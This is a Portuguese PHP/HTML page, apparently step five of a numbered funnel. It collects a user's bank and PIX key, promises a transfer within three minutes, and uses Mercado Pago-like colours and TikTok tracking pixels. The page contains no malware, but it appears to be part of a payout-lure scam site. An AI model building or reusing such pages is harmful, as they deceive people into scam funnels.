<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chave PIX</title>

 
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .form-input:focus {
            border-color: #009EE3;
            box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.1);
        }

        .autocomplete-suggestions {
            border: 1px solid #e5e7eb;
            max-height: 200px;
            overflow-y: auto;
            position: absolute;
            background-color: #fff;
            z-index: 1000;
            margin-top: 4px;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            width: 100%;
        }

        .autocomplete-suggestion {
            padding: 12px 16px;
            cursor: pointer;
            transition: background-color 0.15s;
            border-bottom: 1px solid #f3f4f6;
        }

        .autocomplete-suggestion:last-child {
            border-bottom: none;
        }

        .autocomplete-suggestion:hover {
            background-color: #f9fafb;
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-xl mx-auto">
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Dados para transferência</h1>
                <p class="text-gray-600 mb-8">
                    Informe sua chave PIX para receber o crédito em até 3 minutos
                </p>

                <form id="pixForm">
                    <div class="mb-6">
                        <label class="block text-sm font-medium text-gray-700 mb-2">
                            Banco
                        </label>
                        <div class="relative">
                            <input
                                type="text"
                                id="banco"
                                required
                                autocomplete="off"
                                placeholder="Digite o nome do banco"
                                class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                            >
                            <div id="autocomplete-list" class="autocomplete-suggestions"></div>
                        </div>
                    </div>

                    <div class="mb-8">
                        <label class="block text-sm font-medium text-gray-700 mb-2">
                            Chave PIX
                        </label>
                        <input
                            type="text"
                            id="chavePix"
                            required
                            placeholder="CPF, telefone, e-mail ou chave aleatória"
                            class="form-input w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none transition-all"
                        >
                        <p class="mt-2 text-sm text-gray-500">A chave pode ser de qualquer banco</p>
                    </div>

                    <button
                        type="submit"
                        id="continuarBtn"
                        class="w-full bg-mp-blue text-white py-3.5 rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all"
                    >
                        Continuar
                    </button>
                </form>

                <div class="mt-6 pt-6 border-t border-gray-100">
                    <div class="flex items-start gap-3 text-sm text-gray-600">
                        <svg class="w-5 h-5 text-mp-blue flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                        </svg>
                        <span>A transferência será realizada após a conclusão de todas as etapas</span>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <?php include 'footer.php'; ?>

    <script>
        document.getElementById('pixForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const chavePix = document.getElementById('chavePix').value;
            const banco = document.getElementById('banco').value;

            try {
                localStorage.setItem('chavePix', chavePix);
                localStorage.setItem('banco', banco);
            } catch(err) {
                console.warn('localStorage error:', err);
            }

            const urlParams = new URLSearchParams(window.location.search);
            window.location.href = `6.php?${urlParams.toString()}`;
        });

        const bancos = ["Banco Santander (Brasil) S. A.", "Banco Bradesco S.A.", "Banco do Brasil S.A.", "Caixa Econômica Federal", "Itaú Unibanco S.A.", "AGK Corretora de Câmbio S.A.", "Advanced Corretora de Câmbio Ltda.", "Albatross Corretora de Câmbio e Valores S.A", "Ativa Investimentos S.A. Corretora de Títulos Câmbio e Valores", "Avista S.A. Crédito, Financiamento e Investimento", "BCV - Banco de Crédito e Varejo S/A", "BGC Liquidez Distribuidora de Títulos e Valores Mobiliários Ltda.", "BNY Mellon Banco S.A.", "BPP Instituição de Pagamento S.A.", "BR Partners Banco de Investimento S.A.", "BRK S.A. Crédito, Financiamento e Investimento", "BRL Trust Distribuidora de Títulos e Valores Mobiliários S.A.", "BS2 Distribuidora de Títulos e Valores Mobiliários S.A.", "BT Corretora de Câmbio Ltda.", "Banco A. J. Renner S.A.", "Banco ABC Brasil S.A.", "Banco ABN Amro S.A.", "Banco Agibank S.A.", "Banco Alfa S.A.", "Banco Alvorada S.A.", "Banco AndBank (Brasil) S.A.", "Banco Arbi S.A.", "Banco B3 S.A.", "Banco BMG S.A.", "Banco BNP Paribas Brasil S.A.", "Banco BS2 S.A.", "Banco BTG Pactual S.A.", "Banco Bandepe S.A.", "Banco Bocom BBM S.A.", "Banco Bradescard S.A.", "Banco Bradesco BBI S.A.", "Banco Bradesco BERJ S.A.", "Banco Bradesco Cartões S.A.", "Banco Bradesco Financiamentos S.A.", "Banco C6 S.A.", "Banco Caixa Geral - Brasil S.A.", "Banco Capital S. A.", "Banco Cargill S.A.", "Banco Cetelem S.A.", "Banco Cifra S.A.", "Banco Citibank S.A.", "Banco Clássico S.A.", "Banco Cooperativo Sicredi S. A.", "Banco Cooperativo do Brasil S/A - Bancoob", "Banco Credit Agrícole Brasil S.A.", "Banco Credit Suisse (Brasil) S.A.", "Banco Nubank S.A.", "Banco Cédula S.A.", "Banco Daycoval S.A.", "Banco Fator S.A.", "Banco Fibra S.A.", "Banco Ficsa S. A.", "Banco Finaxis S.A.", "Banco Guanabara S.A.", "Banco Inbursa S.A.", "Banco Industrial do Brasil S.A.", "Banco Indusval S. A.", "Banco Inter S.A.", "Banco Investcred Unibanco S.A.", "Banco ItauBank S.A.", "Banco Itaú BBA S.A.", "Banco Itaú Consignado S.A.", "Banco J. P. Morgan S. A.", "Banco J. Safra S.A.", "Banco John Deere S.A.", "Banco KDB do Brasil S.A.", "Banco Keb Hana do Brasil S. A.", "Banco Luso Brasileiro S.A.", "Banco MUFG Brasil S.A.", "Banco Mercantil do Brasil S.A.", "Banco Mizuho do Brasil S.A.", "Banco Modal S.A.", "Banco Morgan Stanley S. A.", "Banco Máxima S.A.", "Banco Nacional de Desenvolvimento Econômico e Social BNDES", "Banco Olé Bonsucesso Consignado S.A.", "Banco Original S.A.", "Banco Original do Agronegócio S.A.", "Banco Ourinvest S.A.", "Banco Pan S.A.", "Banco Paulista S.A.", "Banco Pine S.A.", "Banco Rabobank International Brasil S.A.", "Banco Rendimento S.A.", "Banco Ribeirão Preto S.A.", "Banco Rodobens SA", "Banco Safra S.A.", "Banco Semear S.A.", "Banco Sistema S.A.", "Banco Smartbank S.A.", "Banco Société Générale Brasil S.A.", "Banco Sofisa S. A.", "Banco Sumitomo Mitsui Brasileiro S.A.", "Banco Topazio S.A.", "Banco Tricury S.A.", "Banco Triângulo S.A.", "Banco VR S.A.", "Banco Votorantim S.A.", "Banco Western Union do Brasil S.A.", "Banco Woori Bank do Brasil S.A.", "Banco da Amazônia S.A.", "Banco da China Brasil S.A.", "Banco de Brasília S.A.", "Banco de La Provincia de Buenos Aires", "Banco de La Republica Oriental del Uruguay", "Banco de la Nacion Argentina", "Banco do Estado de Sergipe S.A.", "Banco do Estado do Pará S.A.", "Banco do Estado do Rio Grande do Sul S.A.", "Banco do Nordeste do Brasil S.A.", "BancoSeguro S.A.", "Banestes S.A. Banco do Estado do Espírito Santo", "Bank of America Merrill Lynch Banco Múltiplo S.A.", "Barigui Companhia Hipotecária", "Bexs Banco de Câmbio S.A.", "Bexs Corretora de Câmbio S/A", "Brasil Plural S.A. Banco Múltiplo", "Broker Brasil Corretora de Câmbio Ltda.", "CM Capital Markets Corretora de Câmbio, Títulos e Valores Mobiliários Ltda.", "Cambionet Corretora de Câmbio Ltda.", "Carol Distribuidora de Títulos e Valores Mobiliários Ltda.", "Caruana S.A. Sociedade de Crédito, Financiamento e Investimento", "Casa do Crédito S.A. Sociedade de Crédito ao Microempreendedor", "Central Cooperativa de Crédito no Estado do Espírito Santo - CECOOP", "Central de Cooperativas de Economia e Crédito Mútuo do Est RS - Unicred", "China Construction Bank (Brasil) Banco Múltiplo S/A", "Citibank N.A.", "Codepe Corretora de Valores e Câmbio S.A.", "Commerzbank Brasil S.A. - Banco Múltiplo", "Confederação Nacional das Cooperativas Centrais Unicred Ltda – Unicred do Brasil", "Confederação Nacional das Cooperativas Centrais de Crédito e Economia Familiar e", "Confidence Corretora de Câmbio S.A.", "Coop de Créd. Mútuo dos Despachantes de Trânsito de SC e Rio Grande do Sul", "Cooperativa Central de Crédito - Ailos", "Cooperativa Central de Crédito Noroeste Brasileiro Ltda - CentralCredi", "Cooperativa de Crédito Rural Coopavel", "Cooperativa de Crédito Rural da Região da Mogiana", "Cooperativa de Crédito Rural de Ouro Sulcredi/Ouro", "Cooperativa de Crédito Rural de Primavera do Leste", "Cooperativa de Crédito Rural de São Miguel do Oeste - Sulcredi/São Miguel", "Credialiança Cooperativa de Crédito Rural", "Credicoamo Crédito Rural Cooperativa", "Credit Suisse Hedging-Griffo Corretora de Valores S.A.", "Dacasa Financeira S/A - Sociedade de Crédito, Financiamento e Investimento", "Decyseo Corretora de Câmbio Ltda.", "Deutsche Bank S.A. - Banco Alemão", "Easynvest - Título Corretora de Valores SA", "Facta Financeira S.A. - Crédito Financiamento e Investimento", "Fair Corretora de Câmbio S.A.", "Frente Corretora de Câmbio Ltda.", "Genial Investimentos Corretora de Valores Mobiliários S.A.", "Get Money Corretora de Câmbio S.A.", "Goldman Sachs do Brasil Banco Múltiplo S. A.", "Guide Investimentos S.A. Corretora de Valores", "Guitta Corretora de Câmbio Ltda.", "HS Financeira S/A Crédito, Financiamento e Investimentos", "HSBC Brasil S.A. Banco de Investimento", "Haitong Banco de Investimento do Brasil S.A.", "Hipercard Banco Múltiplo S.A.", "IB Corretora de Câmbio, Títulos e Valores Mobiliários S.A.", "ICAP do Brasil Corretora de Títulos e Valores Mobiliários Ltda.", "ICBC do Brasil Banco Múltiplo S.A.", "ING Bank N.V.", "Intesa Sanpaolo Brasil S.A. - Banco Múltiplo", "Itaú Unibanco Holding S.A.", "JPMorgan Chase Bank, National Association", "Kirton Bank S.A. - Banco Múltiplo", "Lastro RDV Distribuidora de Títulos e Valores Mobiliários Ltda.", "Lecca Crédito, Financiamento e Investimento S/A", "Levycam - Corretora de Câmbio e Valores Ltda.", "MS Bank S.A. Banco de Câmbio", "Magliano S.A. Corretora de Cambio e Valores Mobiliarios", "Nova Futura Corretora de Títulos e Valores Mobiliários Ltda.", "Novo Banco Continental S.A. - Banco Múltiplo", "Nu Pagamentos S.A. (Nubank)", "OM Distribuidora de Títulos e Valores Mobiliários Ltda.", "Oliveira Trust Distribuidora de Títulos e Valores Mobiliários S.A.", "Omni Banco S.A.", "PI Distribuidora de Títulos e Valores Mobiliários S.A.", "Pagseguro Internet S.A.", "Parana Banco S. A.", "Parmetal Distribuidora de Títulos e Valores Mobiliários Ltda.", "Pernambucanas Financiadora S.A. Crédito, Financiamento e Investimento", "Planner Corretora de Valores S.A.", "PortoCred S.A. Crédito, Financiamento e Investimento", "Portopar Distribuidora de Títulos e Valores Mobiliários Ltda.", "Pólocred Sociedade de Crédito ao Microempreendedor e à Empresa de Pequeno Porte", "QI Sociedade de Crédito Direto S.A.", "RB Capital Investimentos Distribuidora de Títulos e Valores Mobiliários Ltda.", "Renascença Distribuidora de Títulos e Valores Mobiliários Ltda.", "Sagitur Corretora de Câmbio Ltda.", "Scotiabank Brasil S.A. Banco Múltiplo", "Senff S.A. - Crédito, Financiamento e Investimento", "Senso Corretora de Câmbio e Valores Mobiliários S.A.", "Servicoop - Cooperativa de Crédito dos Servidores Públicos Estaduais do Rio Gran", "Socred S.A. - Sociedade de Crédito ao Microempreendedor e à Empresa de Pequeno P", "Sorocred - Crédito, Financiamento e Investimento S/A", "Standard Chartered Bank (Brasil) S.A. Banco de Investimento", "State Street Brasil S.A. - Banco Comercial", "Stone Pagamentos S.A.", "Terra Investimentos Distribuidora de Títulos e Valores Mobiliários Ltda.", "Travelex Banco de Câmbio S.A.", "Treviso Corretora de Câmbio S.A.", "Tullett Prebon Brasil Corretora de Valores e Câmbio Ltda.", "UBS Brasil Banco de Investimento S.A.", "UBS Brasil Corretora de Câmbio, Títulos e Valores Mobiliários S.A.", "Uniprime Central – Central Interestadual de Cooperativas de Crédito Ltda.", "Uniprime Norte do Paraná - Cooperativa de Crédito Ltda.", "Vip's Corretora de Câmbio Ltda.", "Vision S.A. Corretora de Câmbio", "Vortx Distribuidora de Títulos e Valores Mobiliários Ltda.", "XP Investimentos Corretora de Câmbio Títulos e Valores Mobiliários S.A.", "Banco Bari de Investimentos e Financiamentos S.A", "Cooperativa de Crédito Rural de Abelardo Luz - Sulcredi/Crediluz", "MercadoPago.com Representações Ltda.", "Acesso Soluções de Pagamento S.A.", "Órama Distribuidora de Títulos e Valores Mobiliários S.A.", "Crefaz Sociedade de Crédito ao Microempreendedor e a Empresa de Pequeno Porte Lt", "Banco Neon S.A.", "Creditas Sociedade de Crédito Direto S.A.", "Banco Theca S.A."];

        const input = document.getElementById('banco');
        const autocompleteList = document.getElementById('autocomplete-list');

        input.addEventListener('input', function() {
            const value = this.value.toLowerCase();
            autocompleteList.innerHTML = '';

            if (!value) return;

            const filtered = bancos.filter(banco => banco.toLowerCase().includes(value)).slice(0, 8);

            filtered.forEach(banco => {
                const suggestion = document.createElement('div');
                suggestion.classList.add('autocomplete-suggestion');
                suggestion.textContent = banco;
                suggestion.addEventListener('click', function() {
                    input.value = banco;
                    autocompleteList.innerHTML = '';
                });
                autocompleteList.appendChild(suggestion);
            });
        });

        document.addEventListener('click', function(e) {
            if (!autocompleteList.contains(e.target) && e.target !== input) {
                autocompleteList.innerHTML = '';
            }
        });

        input.addEventListener('blur', function() {
            setTimeout(() => {
                autocompleteList.innerHTML = '';
            }, 200);
        });
    </script>
</body>
</html>
